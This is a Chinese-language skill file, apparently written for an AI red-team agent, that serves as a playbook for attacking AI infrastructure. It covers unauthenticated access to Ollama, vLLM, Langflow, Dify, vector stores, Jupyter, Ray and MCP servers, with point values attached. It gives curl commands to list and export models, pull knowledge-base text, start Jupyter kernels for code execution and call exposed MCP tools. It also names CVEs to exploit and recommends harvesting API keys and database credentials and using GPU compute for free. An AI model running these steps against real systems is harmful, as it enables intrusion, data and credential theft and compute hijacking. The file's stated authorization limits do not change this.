---
name: ai-infra-attack
description: AI 基础设施攻击面：Ollama/vLLM/llama.cpp 推理引擎、Langflow/Dify/RAGFlow 低代码 Agent 平台、向量库、训练调度（Jupyter/MLflow/Ray/Triton）、MCP server 的暴露面直取与利用
whenToUse: 扫到 11434/8000/7860/6333/19530/8265/8888 这类端口，或页面是 AI 对话/RAG 知识库/工作流编排界面；靶标含"智能体/大模型/知识库/算力"字样
---

# AI 基础设施攻击（2026 的新主战场）

这类服务有三个特征，决定了它是**性价比最高的一类靶子**：

1. **默认无鉴权**。Ollama 的 `11434`、vLLM 的 `8000`、Ray 的 `8265`、Jupyter 的 `8888`，装完就能用，没人配认证；
2. **一个端口就是一条完整权限**。连上 Ollama 就能拉/删/导出模型，连上 Ray 就能在宿主机执行任意命令；
3. **分值高且少人打**。对应得分点 `ai-agent`（100/个）、`model-compute`（500）、`model-data`（500）、`computepower-admin`（500）、`computepower-cards`（10/张）——**同一台机器按平台权限记 500，别按普通 Web 记 100**。

> 边界：只打授权范围内的目标。本技能默认走「只读判定 → 取证 → 再决定是否深入」，
> 未授权的删除/覆盖类操作（`/api/delete`、模型覆盖写）一律不做。

## 一、先判是什么（端口速查）

| 端口 | 服务 | 一句话判定 |
|---|---|---|
| 11434 | Ollama | `GET /api/tags` 返回 `{"models":[...]}` 即未授权 |
| 8000 / 8001 / 8002 | vLLM / Triton | `GET /v1/models` 返回模型列表；Triton 的 8002 是 gRPC |
| 8080 | llama.cpp server / Weaviate | `GET /props` 或 `GET /v1/models` |
| 7860 | Langflow / Gradio | `GET /config` 有 `components`；Langflow 有 `/api/v1/...` |
| 3000 / 80 | Dify | 登录页 + `GET /console/api/setup` 返回 `{"step":"finished"}` 说明已初始化 |
| 9380 / 80 | RAGFlow | `/v1/api/...`，首页有 RAGFlow 标识 |
| 19530 | Milvus | gRPC；HTTP 侧 9091 是 metrics |
| 6333 / 6334 | Qdrant | `GET /collections` 返回集合名 |
| 8080 / 50051 | Weaviate | `GET /v1/meta` |
| 8000 | Chroma | `GET /api/v1/heartbeat`（老版 `/api/v1/collections`） |
| 8888 | Jupyter | `GET /api` 返回 `{"version":...}`，`/tree` 能列目录 |
| 5000 | MLflow | `GET /api/2.0/mlflow/experiments/search` |
| 8265 | Ray Dashboard | `GET /nodes?view=summary`，有 `ray_version` |
| 3000 | Grafana（常与 AI 平台同机） | `/api/health` |

**统一先跑一遍**（不写任何东西）：

```bash
for p in 11434 8000 7860 6333 8888 8265 5000 9380; do
  printf "%-6s " "$p"
  curl -s -m 4 -o /dev/null -w "%{http_code}\n" "http://<target>:$p/" || echo "-"
done
```

命中后按下面对应章节深入。**每一步都要把原始请求与回显留证**（`redteam_http_evidence_add` 或 `op=entity_add entity=http`）。

## 二、Ollama（11434）——最高频，一台就是 500 分

```bash
# 1) 未授权判定（只读）
curl -s http://<target>:11434/api/tags          # 模型清单
curl -s http://<target>:11434/api/version       # 版本，决定后面能不能打

# 2) 取证：模型清单本身就是「模型相关数据系统」的证据
curl -s http://<target>:11434/api/tags > runs/ollama-tags.json
curl -s http://<target>:11434/api/ps            # 正在跑的模型（说明有人用 = 生产环境）

# 3) 模型导出（model-data 得分）：只对授权范围内做，导出到 runs/ 不要外传
curl -s http://<target>:11434/api/show -d '{"name":"<模型名>"}'
```

**CVE-2026-7482（Bleeding Llama，未授权内存泄露）**：`/api/create` 处理 GGUF 文件时未校验 tensor 元素数量，
构造恶意 GGUF 可触发堆越界读，泄露 Ollama 进程内存（里面有 API key、其他模型的 prompt）。
2026-05 披露，影响面约 30 万台暴露实例。**判定版本 + 用公开 PoC 验一次即可，不要反复打**——
越界读会打出进程崩溃，打崩了目标就没了。

**算力盗取**（`computepower-cards`，10 分/张）：`/api/ps` 里能看到已加载模型与显存占用，
结合 `/api/generate` 能白嫖推理；多卡机器按卡数记。**记分时写明显卡型号与张数**。

## 三、vLLM / llama.cpp（8000 / 8080）

vLLM 是 OpenAI 兼容接口，**默认没有 API key**：

```bash
curl -s http://<target>:8000/v1/models
curl -s http://<target>:8000/v1/chat/completions \
  -H 'Content-Type: application/json' \
  -d '{"model":"<模型名>","messages":[{"role":"user","content":"ping"}]}'
```

能返回补全 = 拿到推理权限。**注意**：vLLM 的 `--api-key` 是常见加固项，返回 401 就说明配了，
不要再爆破（这不是登录口，爆破只会刷日志）。

llama.cpp server：`GET /props` 看 `default_generation_settings`，`POST /completion` 直接推。

## 四、Langflow（7860）——已进 CISA KEV，打了就是 RCE

Langflow 是低代码 Agent 编排平台，一台机器上通常同时跑着 **LLM API key、向量库凭据、RAG 文档库**，
所以它一旦被打穿，等于把整个 AI 应用的数据面一起交了。

已知洞（**按版本对号，不要盲打**）：

| CVE | 类型 | 要点 |
|---|---|---|
| CVE-2025-3248 | 认证绕过（CVSS 9.8） | `/api/v1/validate/code` 未鉴权即可执行代码，1.3.0 修复；披露数小时即在野利用，2025-05 进 KEV |
| CVE-2026-9198 | 代码注入（CVSS 9.8） | 1.10.1 修复，2026-07 进 KEV |
| CVE-2026-5027 | 路径遍历 → 未授权 RCE | 文件访问没有边界，可读写工作流目录 |
| CVE-2025-34291 | RCE | 已被 APT 利用 |

```bash
curl -s http://<target>:7860/health          # 存活
curl -s http://<target>:7860/api/v1/version  # 版本 → 对上面的表
```

命中后优先取 **环境变量里的模型 key 与数据库连接串**（这是 `model-data` 与 `db-credential` 的双份分），
再把工作流 JSON 导出（里面常含内网地址与凭据）。

## 五、Dify（80 / 3000）

Dify 的典型问题是**安全债**：`SECRET_KEY` 硬编码、IDOR、内部端点未授权暴露。

```bash
curl -s http://<target>/console/api/setup                 # {"step":"finished"} 说明已初始化
curl -s http://<target>/api/workspaces/current/members     # 未授权时直接出成员列表
```

重点看三类：
1. `/console/api/` 下的管理接口是否跳过鉴权（IDOR：换 `workspace_id` / `app_id` 越权读别人的应用）；
2. 硬编码 `SECRET_KEY` → 可伪造 JWT 直接登管理员（拿到就是 `ai-agent` 的"能操作 agent 工具"证据）；
3. 内部端点（`/v1/internal/`）暴露 → 直接调模型、读知识库。

## 六、RAGFlow / 向量库——数据面

RAGFlow（9380/80）：`/v1/api/` 下的 dataset/document 接口，未授权能列全部知识库与文档。

向量库基本都是裸的：

```bash
curl -s http://<target>:6333/collections                    # Qdrant
curl -s http://<target>:8080/v1/meta                        # Weaviate
curl -s http://<target>:8000/api/v1/collections             # Chroma
# Milvus 走 gRPC 19530，用 pymilvus：connections.connect(host=..., port=19530)
```

拿到集合名后直接 `scroll`/`search` 拉向量与原文——**知识库原文就是 `model-data` 的"模型相关数据"证据**，
记分时写清「哪个库、多少条、什么业务数据」。**注意**：不要 dump 全量，抽 100 条证明可达即可，
全量导出既慢又容易触发告警。

## 七、训练与调度——最容易一击致命

| 服务 | 端口 | 打法 |
|---|---|---|
| Jupyter | 8888 | `/api/contents` 列目录 → `/api/kernels` 起内核 → 执行任意代码（等于宿主机 shell） |
| MLflow | 5000 | 未授权读实验/artifact；artifact 里常含训练数据与凭据 |
| Ray Dashboard | 8265 | 未授权提交 job → **宿主机任意命令**（ShadowRay 类问题，`/api/jobs`） |
| Triton | 8000/8002 | 模型仓库路径遍历、模型投毒 |
| Kubeflow | 80 | 未授权 pipeline 上传 → 集群内执行 |

Jupyter 是最快的一条：

```bash
curl -s http://<target>:8888/api/contents?path=/        # 列目录
curl -s -X POST http://<target>:8888/api/kernels -H 'Content-Type: application/json' -d '{}'
# 拿到 kernel id 后走 /api/kernels/<id>/channels 的 websocket 执行
```

Ray 更直接（**只读判定，别真提交 job**，提交了等于在别人生产集群上跑命令）：

```bash
curl -s "http://<target>:8265/nodes?view=summary" | head -c 800
```

## 八、MCP server——2026 年新增的一类暴露面

Agent 工具链的 MCP server 常被直接暴露在 HTTP 上，且**多数没有认证**：

```bash
curl -s -X POST http://<target>:<port>/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
```

能列出工具 = 能调工具。重点看有没有 `exec`/`shell`/`read_file`/`http_request` 这类工具——
有的话就是**直接命令执行**（对应 `ai-agent` 的"能操作 agent 工具"）。同一个端点还能 `tools/call`。

## 九、判定顺序（先轻后重，别一上来就 RCE）

1. **只读探测**：版本、模型清单、集合名、节点列表——全部 GET，不改变任何状态；
2. **取证**：把返回体存 `runs/`，记 `http` 证据；
3. **落库**：`asset`（这台是 AI 平台，写清产品+版本）+ `vuln`（未授权/具体 CVE）；
4. **记分**：先判是哪一类——
   - 推理引擎/Agent 平台的控制权 → `ai-agent` 或 `model-compute`（**500 档，别记成 web-app 100**）
   - 知识库/训练数据原文 → `model-data`
   - 算力卡资源 → `computepower-cards`（按张数）
   - 只是暴露了个 Web 登录页 → 才走 `web-app`
5. **再决定深入**：拿 shell（`webshell-toolkit`）、取凭据横向（`credential-attack`）。

## 十、常见误判（踩过的）

- **把 Ollama 的 11434 当成普通 HTTP 服务**：它没有登录页，`/` 返回 `Ollama is running`，
  很多人以为没东西就走了。**必须打 `/api/tags`**。
- **把 vLLM 的 401 当成"有洞打不进去"**：401 是配了 api-key，是加固到位，不是漏洞。
- **把 Langflow 的 Gradio 界面当成普通 Web**：`/config` 会泄露全部组件与后端地址。
- **记分档次记错**：AI 平台按 `model-compute` 500，不要因为"它是个网页"就记 `web-app` 100——
  这是同一台机器上最容易丢的 400 分。



<!-- second-shot:start scripts/inject-second-shot.mjs 生成，勿手改 -->

## 第二发（主力打不出去时，按这个顺序换）

1. **前提没满足就先回去**：`web-fingerprint`、`nuclei-scan` —— 上一环没做实，本环再试也是空打

2. **无回显 / 被拦**：先用 `oob-verification` 确认是不是真没打进去（没回显 ≠ 没命中）；确认被 WAF 拦就转 `waf-bypass`

**纪律**：同一手法不许连打三次（第一次是验证、第二次换参数、第三次必须换手法）；换完还不动，就**如实回报**试过哪几条、各自现象是什么——这是下一次改打的依据，不是失败。

second-shot:end -->

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：3 漏洞发现｜**角色**：`vuln-scan`
- **上游**（先做完这些再进来）：`web-fingerprint`、`nuclei-scan`
- **下游**（产出交给谁）：`credential-attack`、`webshell-toolkit`、`llm-security`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`vuln` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据

<!-- /skill-link-graph -->
